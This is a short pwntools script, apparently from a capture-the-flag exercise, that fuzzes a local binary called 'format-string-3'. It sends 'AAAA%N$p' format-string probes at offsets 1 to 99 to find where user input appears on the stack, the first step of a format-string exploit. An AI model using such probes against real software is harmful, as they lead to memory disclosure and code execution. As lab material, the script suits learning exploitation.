from pwn import *

elf = context.binary = ELF('./format-string-3')
context.log_level = 'warning'

for i in range(1, 100):
    try:
        p = process()

        p.recvlines(2)

        p.sendline('AAAA%{}$p'.format(i).encode())

        result = p.recvline()
        print(str(i) + ': ' + str(result))
        p.close()

    except EOFError:
        pass

